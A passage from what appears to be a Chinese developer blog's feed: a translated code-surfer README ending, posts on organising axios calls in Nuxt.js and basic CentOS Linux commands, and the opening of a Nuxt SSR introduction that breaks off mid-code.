“prismjs/components/prism-smalltalk”</p><CodeSurfer><p>​```smalltalk<br>result := a &gt; b<br>    ifTrue:[ ‘greater’ ]<br>    ifFalse:[ ‘less or equal’ ]</p><pre><code>&lt;/CodeSurfer&gt;</code></pre><h2 id="列"><a href="#列" class="headerlink" title="列"></a>列</h2><p>如果需要同时显示多个代码, 请使用 <code>&lt;CodeSurferColumns&gt;</code>:</p><p>​````md<br>import { CodeSurferColumns, Step } from “code-surfer”</p><CodeSurferColumns><Step subtitle="First Step"><p>​```js<br>console.log(1);<br>console.log(2);</p><pre><code>```jsconsole.log(&quot;a&quot;);console.log(&quot;b&quot;);</code></pre></Step><Step subtitle="Second Step"><pre class=" language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre class=" language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"b"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></Step></CodeSurferColumns>````<p>每个 <code>&lt;Step&gt;</code> 有自己的 <code>title</code> and <code>subtitle</code>.</p><p>你可以为各列使用不同的主题: <code>&lt;CodeSurferColumns themes={[nightOwl, ultramin]}&gt;</code>. 并更改列的相对大小 <code>&lt;CodeSurferColumns sizes={[1,3]}&gt;</code>.</p><p>列不仅用于代码，还可以将它们用于任何类型的内容：</p><p>​````md<br>import { CodeSurferColumns, Step } from “code-surfer”<br>import MyComponent from “./my-component.jsx”</p><CodeSurferColumns><Step><p>​```js<br>console.log(1);<br>console.log(2);</p><pre><code># Some Markdown&lt;/Step&gt;&lt;Step&gt;```js 2console.log(1);console.log(2);</code></pre><MyComponent/></Step></CodeSurferColumns>````<h2 id="导入代码文件"><a href="#导入代码文件" class="headerlink" title="导入代码文件"></a>导入代码文件</h2><p>你可以从文件中导入代码，而不必在代码块中编写代码：</p><p>​````md<br>import { CodeSurfer } from “code-surfer”</p><CodeSurfer><p>​```js 5:10 file=./my-code.js</p><pre><code>```js file=./my-other-code.js</code></pre></CodeSurfer>````<h2 id="行号"><a href="#行号" class="headerlink" title="行号"></a>行号</h2><p>要显示行号，将<code>showNumbers</code>添加到语言标识之后:</p><p>​````md<br>import { CodeSurfer } from “code-surfer”</p><CodeSurfer><p>​```js showNumbers<br>console.log(1);<br>console.log(2);<br>console.log(3);</p><pre><code>```jsconsole.log(1);console.log(2);console.log(4);</code></pre></CodeSurfer>````<h2 id="差异"><a href="#差异" class="headerlink" title="差异"></a>差异</h2><p>代码块也可以展示差异。 This is particularly useful when using empty diffs for code that doesn’t change:</p><p>代码块也可以展示差异。 当讲空的diffs用在不变的代码块时候，这特别有用：</p><p>​````md<br>import { CodeSurfer } from “code-surfer”</p><CodeSurfer><p>​```js<br>console.log(1);<br>console.log(2);<br>console.log(3);</p><pre><code>```diff 1 subtitle=&quot;log 1&quot;</code></pre><pre class=" language-diff"><code class="language-diff"></code></pre><pre class=" language-diff"><code class="language-diff"></code></pre></CodeSurfer>````<h2 id="相关"><a href="#相关" class="headerlink" title="相关"></a>相关</h2><ul><li><a href="https://github.com/jxnblk/mdx-deck" target="_blank" rel="noopener">MDX Deck</a></li><li><a href="https://github.com/jamiebuilds/spectacle-code-slide" target="_blank" rel="noopener">spectacle-code-slide</a></li><li><a href="https://github.com/PrismJS/prism" target="_blank" rel="noopener">Prism</a></li><li><a href="https://github.com/pomber/create-code-surfer-deck" target="_blank" rel="noopener">create-code-surfer-deck</a></li><li><a href="https://github.com/pomber/gatsby-waves" target="_blank" rel="noopener">Gatsby Waves</a></li></ul><h2 id="支持-Code-Surfer"><a href="#支持-Code-Surfer" class="headerlink" title="支持 Code Surfer"></a>支持 Code Surfer</h2><p>你可以帮助保持该项目的生命。</p><h3 id="赞助商"><a href="#赞助商" class="headerlink" title="赞助商"></a>赞助商</h3><p>通过成为赞助者来支持该项目。你的徽标将显示在此处，并带有指向你网站的链接。 [<a href="https://opencollective.com/code-surfer#sponsor" target="_blank" rel="noopener">成为赞助商</a>]</p><p><a href="https://opencollective.com/code-surfer/sponsor/0/website" target="_blank"><img src="https://opencollective.com/code-surfer/sponsor/0/avatar.svg"></a></p><h3 id="支持者"><a href="#支持者" class="headerlink" title="支持者"></a>支持者</h3><p>感谢所有的支持者! 🙏 [<a href="https://opencollective.com/code-surfer#backer" target="_blank" rel="noopener">成为支持者</a>]</p><p><a href="https://opencollective.com/code-surfer#backers" target="_blank"><img src="https://opencollective.com/code-surfer/backers.svg?width=890"></a></p><h3 id="贡献者"><a href="#贡献者" class="headerlink" title="贡献者"></a>贡献者</h3><p>这个项目的存在要感谢所有贡献者。<br><img src="https://opencollective.com/code-surfer/contributors.svg?width=890&button=false" /></p><p>````</p>]]></content>
      
      
      <categories>
          
          <category> 翻译 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> code-surfer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在nuxtjs中组织api调用</title>
      <link href="/2020/04/20/front-end/axios-in-nuxt/"/>
      <url>/2020/04/20/front-end/axios-in-nuxt/</url>
      
        <content type="html"><![CDATA[<p>对与api的组织调用，nuxtjs的官方文档都是<code>axios.get(&#39;https://jsonplaceholder.typicode.com/users&#39;)</code>这样的格式。简单的用一用，也问题不大，但是项目一大之后，对请求url的管理，前置，后置拦截器的处理，就比较麻烦了。</p><h3 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h3><p>拦截器的设置相对简单，官方文档也有介绍。</p><p>这里传入的参数是<code>context</code>,<code>$axios, store</code>都是挂载在它上面的属性。</p><p>不要使用 <code>import axios from &#39;axios&#39;</code>的形式,在<code>nuxt</code>中，<code>axios</code>可以在服务端，和客户端两种环境执行，框架已经对这两种情况做了封装，直接在插件目录引用<code>axios</code>就可以</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// plugins/axios.js</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">{</span> $axios<span class="token punctuation">,</span> store <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  $axios<span class="token punctuation">.</span><span class="token function">onRequest</span><span class="token punctuation">(</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request'</span><span class="token punctuation">)</span>    store<span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token string">'showloading'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> config  <span class="token punctuation">}</span><span class="token punctuation">)</span>  $axios<span class="token punctuation">.</span><span class="token function">onResponse</span><span class="token punctuation">(</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    store<span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token string">'showloading'</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>response<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> response    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  $axios<span class="token punctuation">.</span><span class="token function">onError</span><span class="token punctuation">(</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    store<span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token string">'showloading'</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h3 id="api-的组织和分离"><a href="#api-的组织和分离" class="headerlink" title="api 的组织和分离"></a>api 的组织和分离</h3><p>但是怎么样分离<code>api</code>?</p><h4 id="1-依赖注入的方式注入axios"><a href="#1-依赖注入的方式注入axios" class="headerlink" title="1. 依赖注入的方式注入axios"></a>1. 依赖注入的方式注入<code>axios</code></h4><p>通过函数参数的形式，把<code>axios</code>注入到上下文中，直接调用。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// api/index.js</span><span class="token comment" spellcheck="true">// 高阶函数</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">(</span>axios<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">{</span>  <span class="token function">index</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/word'</span><span class="token punctuation">,</span> params<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h4 id="2-使用nuxtjs插件注入axios"><a href="#2-使用nuxtjs插件注入axios" class="headerlink" title="2.使用nuxtjs插件注入axios"></a>2.使用<code>nuxtjs</code>插件注入<code>axios</code></h4><ul><li>我们如何在整个Nuxt应用程序中<strong>访问</strong><code>api</code>？</li><li>我们如何从Nuxt模块正确<strong>传入</strong> axios实例？</li></ul><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// plugins/axios-api-plugin.js</span><span class="token keyword">import</span> createApi <span class="token keyword">from</span> <span class="token string">'~/api/index'</span><span class="token comment" spellcheck="true">// 这里ctx也可以访问到store</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> inject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 注入上下文</span>  <span class="token comment" spellcheck="true">// 挂载到vue实例上面 (组件中使用：this.$api)</span>  <span class="token keyword">const</span> apiAxios <span class="token operator">=</span> <span class="token function">createApi</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>$axios<span class="token punctuation">)</span>  <span class="token function">inject</span><span class="token punctuation">(</span><span class="token string">'api'</span><span class="token punctuation">,</span> <span class="token function">apiAxios</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>再把上面的代码作为插件配置到<code>plugins</code>中就可以像这样调用api：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 客户端 </span><span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span>$api<span class="token punctuation">.</span><span class="token function">index</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 服务端 asyncData /fetch</span><span class="token keyword">await</span> ctx<span class="token punctuation">.</span>app<span class="token punctuation">.</span>api<span class="token punctuation">.</span><span class="token function">index</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span></code></pre><p>这样封装之后，模块清晰，可维护性大大增加。</p><h3 id="可运行示例："><a href="#可运行示例：" class="headerlink" title="可运行示例："></a>可运行示例：</h3><p><a href="https://github.com/justOneWord/one_word_web" target="_blank" rel="noopener">https://github.com/justOneWord/one_word_web</a></p><h4 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h4><p><a href="https://blog.lichter.io/posts/nuxt-api-call-organization-and-decoupling/" target="_blank" rel="noopener">https://blog.lichter.io/posts/nuxt-api-call-organization-and-decoupling/</a></p><p><a href="https://codesandbox.io/s/github/manniL/nuxt-decouple-and-organize-api-calls" target="_blank" rel="noopener">https://codesandbox.io/s/github/manniL/nuxt-decouple-and-organize-api-calls</a></p><p><a href="https://zh.nuxtjs.org/api/context" target="_blank" rel="noopener">https://zh.nuxtjs.org/api/context</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nuxt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础Linux学习</title>
      <link href="/2020/03/29/ops/learnlinux/"/>
      <url>/2020/03/29/ops/learnlinux/</url>
      
        <content type="html"><![CDATA[<p>现在的服务都是部署在宝塔的基础上，基本是0技术要求，学习Linux，准备在下半年的服务换成原生的linux，不再依赖第三方控制面板。以下学习都是以<code>Centos 7</code>为基础。</p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ol><li><p><code>init 0</code>: 关机</p></li><li><p><code>init 6</code>: 重启</p></li><li><p><code>ip addr</code>: 获取 ip 地址</p></li><li><p><code>pwd</code>: 显示当前路径</p></li><li><p><code>clear</code>或者<code>ctrl + l</code>:  清屏</p></li><li><p><code>history</code> ：查看历史命令</p></li><li><p><code>! + num</code>：使用历史命令</p></li></ol><h3 id="用户操作"><a href="#用户操作" class="headerlink" title="用户操作"></a>用户操作</h3><ol><li>添加用户：<code>useradd zhangsan</code></li><li>设置密码：<code>passwd zhangsan</code></li><li>删除用户：<code>userdel -rf zhangsan</code></li></ol><h3 id="Linux-常见目录结构"><a href="#Linux-常见目录结构" class="headerlink" title="Linux 常见目录结构"></a>Linux 常见目录结构</h3><p><strong>root 目录：</strong>linxu 超级权限root 的主目录。*</p><p><strong>home 目录：</strong>系统默认的用户主目录，如果添加用户是不指定用户的主目录，默认在/home<br>下创建与用户同名的文件夹。*</p><p><strong>bin 目录：</strong>存放系统所需要的重要命令，比如文件或目录操作的命令ls、cp、mkdir 等，另外<br>/usr/bin 也放了一些系统命令。这些命令对应着文件都是可以执行的。*</p><p><strong>sbin 目录：</strong>存放只有root 超级管理员才能执行的程序*</p><p><strong>boot 目录：</strong>存放着linux 启动时内核及引导系统程序所需要的核心文件，内核文件和grub<br>系统引导管理器都位于此目录。</p><p><strong>dev 目录：</strong>存放这linux 系统下的设备文件，如光驱等。</p><p><strong>etc 目录：</strong>存放系统的配置文件，作为一些软件启动时默认配置文件读取的目录，如/etc/fstal<br>存放系统分析信息。*</p><p><strong>mnt 目录：</strong> 临时文件挂载目录、也可以说是测试目录</p><p><strong>opt 目录：</strong> 第三方软件存放目录*</p><p><strong>media 目录：</strong>即插即用型设备挂载点，光盘默认挂载点，通常光盘挂载于/mnt/cdrom 下。</p><p><strong>tmp 目录：</strong>临时文件夹。*</p><p><strong>usr 目录：</strong>应用程序存放目录，安装linux 软件包是默认安装到/usr/local 目录下。*</p><p><strong>var 目录：</strong>目录经常变动，/var/log 存放系统日志，/var/log 存放系统库文件。*</p><h3 id="Linux-文件管理"><a href="#Linux-文件管理" class="headerlink" title="Linux 文件管理"></a>Linux 文件管理</h3><ol><li><p>创建文件： </p><p><code>touch file</code></p></li><li><p>删除文件：</p><p><code>rm -rf file</code></p><p><strong>-r:</strong> 递归的删除目录下面文件以及子目录下文</p><p><strong>-f:</strong> 强制删除，忽略不存在的文件，不给出提示</p></li><li><p>移动文件/修改文件名</p><p><code>mv file1 file2</code></p></li><li><p>查看文件内容</p><p><code>cat file</code></p></li><li><p>复制文件</p><p><code>cp file1 file2</code></p></li><li><p>批量创建文件</p><pre class=" language-shell"><code class="language-shell">touch file{1..10}touch -rd file{1..10}</code></pre></li><li><p>编辑文件</p><p><code>vi file</code></p></li><li><p>管道方式查看文件</p><pre class=" language-shell"><code class="language-shell">cat file | head -3 // 查看前3行cat file | tail -3 // 查看后3行</code></pre></li><li><p>文件查找</p><p>方法1：</p><p><code>find 目录 -name 文件名</code></p><p>方法2（更快）：</p><pre class=" language-bash"><code class="language-bash">// 建立数据库updatedb// 数据库中查找<span class="token function">locate</span> aa.txt </code></pre></li></ol><h3 id="Linux-目录管理"><a href="#Linux-目录管理" class="headerlink" title="Linux 目录管理"></a>Linux 目录管理</h3><ol><li><p>创建目录</p><p><code>mkdir dir1 dir2 dir3</code></p></li><li><p>重命名/移动目录</p><p><code>mv dir 1 dir2</code></p></li><li><p>删除目录</p><p><code>rm -rf dir1</code></p></li><li><p>复制目录</p><p><code>cp -rf dir1 dir2</code></p></li><li><p>显示目录结构</p><p><code>tree(需要安装)</code></p></li></ol><h3 id="Linux-文件类型"><a href="#Linux-文件类型" class="headerlink" title="Linux 文件类型"></a>Linux 文件类型</h3><ol><li><p>​    查看文件类型<code>ll</code></p></li><li><p>​    常见文件类型</p><pre class=" language-shell"><code class="language-shell">-rw-r—r— "-“开头的都是普通文件;drw-r—r— "d"开头的是目录文件;lrw-r—r— "l"开头的文件都是软链接文件;</code></pre></li></ol><h3 id="Linux-打包压缩"><a href="#Linux-打包压缩" class="headerlink" title="Linux 打包压缩"></a>Linux 打包压缩</h3><ol><li><p>Zip</p><p>压缩：</p><p><code>zip -r public.zip public</code></p><p>-r    表示将指定的目录下的所有子目录以及文件一起处理</p><p>解压：</p><p><code>unzip public.zip -d dir</code></p><p>查看压缩包内容</p><p><code>unzip -l public.zip</code></p></li><li><p>gz 压缩包</p><pre class=" language-shell"><code class="language-shell">tar czvf public.tar.gz public // 压缩tar xzvf public.atr.gz // 解压tar tf public.atr.gz // 查看tar cvf public.tar public // 仅打包，不压缩tar xvf public.tar // 解压无gz的包</code></pre></li></ol><h3 id="Linux-别名管理"><a href="#Linux-别名管理" class="headerlink" title="Linux 别名管理"></a>Linux 别名管理</h3><pre><code>// 添加别名alias aa=&#39;cat /etc/httpd/conf/httpd.conf&#39;// 删除别名unalias aa// 查看别名alias</code></pre><h3 id="内存、cup-管理"><a href="#内存、cup-管理" class="headerlink" title="内存、cup 管理"></a>内存、cup 管理</h3><p><code>top</code></p><ol><li><p>第一行</p><pre class=" language-shell"><code class="language-shell">top - 15:31:47 up 9:30, 3 users, load average: 0.00, 0.02, 0.05</code></pre><p>依次对应：系统当前时间 up 系统到目前为止i 运行的时间， 当前登陆系统的用户数量， load average 后<br>面的三个数字分别表示距离现在一分钟，五分钟，十五分钟的负载情况。</p></li></ol><ol start="2"><li><p>第二行</p><pre><code>Tasks: 133 total, 1 running, 132 sleeping, 0 stopped, 0 zombie</code></pre><p>依次对应：tasks 表示任务（进程），133 total 则表示现在有133 个进程，其中处于运行中<br>的有1 个，132 个在休眠（挂起），stopped 状态即停止的进程数为0，zombie 状态即僵尸<br>的进程数为0 个。</p></li><li><p>top 命令的第三行，cpu 状态：</p><pre class=" language-shell"><code class="language-shell">%Cpu(s): 0.2 us, 0.4 sy, 0.0 ni, 99.3 id, 0.0 wa, 0.0 hi, 0.1 si, 0.0 st</code></pre><p><strong>只看空闲就可以了</strong>：cpu 空闲率为99.3%</p><p>依次对应：<br><strong>us</strong>:user 用户空间占用cpu 的百分比<br><strong>sy</strong>:system 内核空间占用cpu 的百分比<br><strong>ni</strong>:niced 改变过优先级的进程占用cpu 的百分比<br><strong>id</strong>:空闲cpu 百分比<br><strong>wa</strong>:IO wait IO 等待占用cpu 的百分比<br><strong>hi</strong>:Hardware IRQ 硬中断占用cpu 的百分比<br><strong>si</strong>:software 软中断占用cpu 的百分比<br><strong>st</strong>:被hypervisor 偷去的时间</p></li><li><p>top 命令的第四行，内存状态：</p><pre><code>KiB Mem : 2897496 total, 1995628 free, 191852 used, 710016 buff/cache</code></pre><p>总内存:2.76g 空闲：1995628/1024/1024=1.9g 已经使用0.18g 缓存区内存0.67g<br>缓冲区是从主内存中特地预留出的内存，用来存放特定的一些信息，例如从磁盘中取得的文件表，程序正<br>在读取的内容等等</p></li><li><p>top 命令第七行，各进程的监控：</p><pre><code>PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND</code></pre><p>依次对应：<br><strong>PID</strong> — 进程id<br><strong>USER</strong> — 进程所有者<br><strong>PR</strong> — 进程优先级<br><strong>NI</strong> — nice 值。负值表示高优先级，正值表示低优先级<br><strong>VIRT</strong> — 进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES</p><p><strong>RES</strong> — 进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA<br><strong>SHR</strong> — 共享内存大小，单位kb<br><strong>S</strong> — 进程状态。D=不可中断的睡眠状态R=运行S=睡眠T=跟踪/停止Z=僵尸进程<br>**%CPU** — 上次更新到现在的CPU 时间占用百分比<br>**%MEM** — 进程使用的物理内存百分比<br><strong>TIME+</strong> — 进程使用的CPU 时间总计，单位1/100 秒<br><strong>COMMAND</strong> — 进程名称（命令名/命令行）</p></li></ol><p><code>uptime</code></p><ol><li><p>uptime</p><pre><code>top - 15:31:47 up 9:30, 3 users, load average: 0.00, 0.02, 0.05</code></pre><p>1.服务器工作时间<br>2.在线用户<br>3.平均负载一分钟，五分钟，十五分钟的负载情况</p></li></ol><h3 id="查看登录用户"><a href="#查看登录用户" class="headerlink" title="查看登录用户"></a>查看登录用户</h3><ol><li><p><code>who</code>:显示当前正在系统中的所有用户名字，使用终端设备号，注册时间</p></li><li><p><code>who am i</code>: 显示出当前终端上使用的用户</p></li><li><p><code>last</code>:显示近期用户或终端的登录情况</p></li></ol><h3 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h3><ol><li><p>查看进程</p><pre class=" language-shell"><code class="language-shell">pstree # 查看进程树pstree -ap #显示所有详细(进程、子进程、进程号)pstree | grep httpdpstree -ap | grep httpd</code></pre></li><li><p>关闭进程</p><pre class=" language-shell"><code class="language-shell">pkill httpd # pkill 进程的名字kill 2245 # 进程号kill -9 2245   # 强制杀死进程</code></pre></li></ol><h3 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h3><pre class=" language-shell"><code class="language-shell">netstat -tunpl |grep httpd </code></pre><p> -t 或–tcp 显示TCP 传输协议的连线状况。</p><p> -u 或–udp 显示UDP 传输协议的连线状况。</p><p> -n 或–numeric 直接使用IP 地址，而不通过域名服务器。</p><p> -p 或–programs 显示正在使用Socket 的程序识别码和程序名称。</p><p> -l 或–listening 显示监控中的服务器的Socket。</p><h3 id="查看硬盘信息"><a href="#查看硬盘信息" class="headerlink" title="查看硬盘信息"></a>查看硬盘信息</h3><pre><code>dfdf -h # 以人们易读的方式显示，总共多少g 用了多少gdf /home # 查看该文件夹所在磁盘的使用情况</code></pre><h3 id="使用-systemctl-管理服务"><a href="#使用-systemctl-管理服务" class="headerlink" title="使用 systemctl 管理服务"></a>使用 systemctl 管理服务</h3><p>systemctl 就是service 和chkconfig 这两个命令的整合，在CentOS 7 就开始被使用了,systemctl<br>是系统服务管理器命令，它实际上将service 和chkconfig 这两个命令组合到一起。</p><pre class=" language-shell"><code class="language-shell">systemctl start nginx # 启动服务systemctl stop nginx # 关闭服务systemctl restart ngonx # 重启服务systemctl enable httpd # 设置开机自启动systemctl disable nginx # 停止开机自启动systemctl list-unit-files|grep enabled # 列出所有自启动服务systemctl reload nginx # 重新加载配置</code></pre><h3 id="Firewakkd-防火墙设置"><a href="#Firewakkd-防火墙设置" class="headerlink" title="Firewakkd 防火墙设置"></a>Firewakkd 防火墙设置</h3><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><pre class=" language-shell"><code class="language-shell">systemctl start firewalld # 启动systemctl stop firewalld # 关闭systemctl status firewalled # 查看状态systemctl disable firewalld # 开机禁用systemctl enable firewalld # 开机启用</code></pre><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><pre class=" language-shell"><code class="language-shell">firewall-cmd --state # 显示状态firewall-cmd --zone=public --list-ports # 查看所有打开的端口firewall-cmd --reload # 更新规则firewall-cmd --zone=public --add-port=80/tcp --permanent  # 开启80端口，–permanent 永久生效，没有此参数重启后失效firewall-cmd --reload # 重新载入firewall-cmd --zone=public --query-port=80/tcp # 查看端口firewall-cmd --zone=public --remove-port=80/tcp --permanent # 删除</code></pre>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端nuxt框架ssr初体验</title>
      <link href="/2020/03/08/front-end/qian-duan-nuxt-kuang-jia-ssr-chu-ti-yan/"/>
      <url>/2020/03/08/front-end/qian-duan-nuxt-kuang-jia-ssr-chu-ti-yan/</url>
      
        <content type="html"><![CDATA[<h2 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h2><p>贵圈真乱..<code>nuxt、nest、next</code> ，已经快傻傻分不清楚了…</p><p>前端的车轮，碾压了青春，耗费了精力，疲于奔命，还是归本溯源，天知道…</p><h2 id="从前端的性能优化说起"><a href="#从前端的性能优化说起" class="headerlink" title="从前端的性能优化说起"></a>从前端的性能优化说起</h2><p>前端的性能优化，谷歌可以一大堆，他们说的当然都是非常有道理的。webpack打包优化，cdn，css权重，雪碧图？似乎都对。还记得一开始学前端时候，经常听到雅虎军规，曾经的优化圣经，现在还适用吗？</p><blockquote><p>雅虎军规：</p><ol><li>尽量减少HTTP请求数</li><li>使用内容发布网络</li><li>添加Expires头</li><li>压缩组件（使用gzip编码压缩http响应包）</li><li>将样式表放在顶部</li><li>将脚本放在底部</li><li>避免CSS表达式</li><li>使用外部的JavaScript和CSS</li><li>减少DNS查找</li><li>精简Javascript</li><li>避免重定向</li><li>移除重复脚本</li><li>配置ETag</li><li>使Ajax可缓存</li></ol></blockquote><p>我们现在基本上还是在遵守这些规则，只是有时候并不感知，打包工具帮我们做了大部分的事情。</p><p>前端性能优化，加快传输，加快渲染。现在的spa页面，不利于seo（虽然已经不重要了），无法避免加载白屏的问题。</p><p>历史，在召唤新的解决方案。</p><h3 id="高大上的ssr是什么"><a href="#高大上的ssr是什么" class="headerlink" title="高大上的ssr是什么"></a>高大上的ssr是什么</h3><p>服务端渲染，听起来就挺高大上的。然而，这并不是什么新技术。在很久很久以前<code>php</code>的<code>smarty</code>模板引擎，<code>java</code>的<code>jsp</code>，都可以称为服务端渲染。简单来说，服务端，给到客户端的是已经渲染好的html，浏览器可以立即解析，呈现页面。现在的主流框架都是空页面，然后加载js，通过js渲染出页面。</p><p>一般的spa页面，往往在渲染过程中，还会涉及<code>ajax</code>的请求发送，极端情况，可能一开始就有七八个请求，这种用户体验能好，才奇怪了。在这个过程中，页面基本上是不可用的，会出现loading状态，或者骨架屏状态。</p><p>能不能，复古一点，服务端直接渲染好页面，前端不发送初始化请求，前端拿到页面直接渲染，交互再通过ajax？</p><p><code>vue</code>也提供了ssr的渲染方案，社区中比较成熟的要数<code>nuxt</code>实现。</p><h3 id="nuxt-入门"><a href="#nuxt-入门" class="headerlink" title="nuxt 入门"></a>nuxt 入门</h3><p>nuxt 整体学习门槛不高，我整理下我学习遇到的集个问题，详细的还请查看文档。</p><h4 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h4><pre class=" language-javascript"><code class="language-javascript">$ npx create<span class="token operator">-</span>nuxt<span class="token operator">-</span>app <span class="token operator">&lt;</span>项目名<span class="token operator">></span></code></pre><h4 id="2-路由"><a href="#2-路由" class="headerlink" title="2. 路由"></a>2. 路由</h4><p>在pages目录下的vue文件，会自动配置为路由，不需要手动配置。参数的获取遵循约定即可（详情，请查看文档）</p><h4 id="3-异步数据-asyncData"><a href="#3-异步数据-asyncData" class="headerlink" title="3. 异步数据(asyncData)"></a>3. 异步数据(<code>asyncData</code>)</h4><p>框架提供了<code>asyncData</code>获取异步数据，注意：<code>asyncData</code>方法会在组件（<strong>限于页面组件</strong>）每次加载之前被调用。它可以在服务端或路由更新之前被调用。</p><p><code>asyncData</code>执行的时候，页面还没有初始化，访问不到页面的方法，<code>asyncData</code>的返回结果，会被挂载到页面的data上面，渲染的时候，可以拿到数据，<code>server</code>端渲染为<code>html</code></p><h4 id="4-异步数据（fetch）"><a href="#4-异步数据（fetch）" class="headerlink" title="4.异步数据（fetch）"></a>4.异步数据（fetch）</h4><p><em>fetch 方法用于在渲染页面前填充应用的状态树（store）数据， 与 asyncData 方法类似，不同的是它不会设置组件的数据。</em></p><h4 id="5-vuex"><a href="#5-vuex" class="headerlink" title="5. vuex"></a>5. vuex</h4><p>按照示例直接声明即可，不需要进行实例化</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">export</span> <span class="token keyword">const</span> state <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">{</span>  counter<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">export</span> <span class="token keyword">const</span> mutations <span class="token operator">=</span> <span class="token punctuation">{</span>  increment <span class="token punctuation">(</span>state<span class="token punctuation">)</span> <span class="token punctuation">{</span>    state<span class="token punctuation">.</span>counter<span class="token operator">++</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">const</span> actions<span class="token operator">=</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 服务端执行</span>  <span class="token keyword">async</span> <span class="token function">nuxtServerInit</span><span class="token punctuation">(</span><span class="token punctuation">{</span> commit <span class="token punctuation">}</span><span 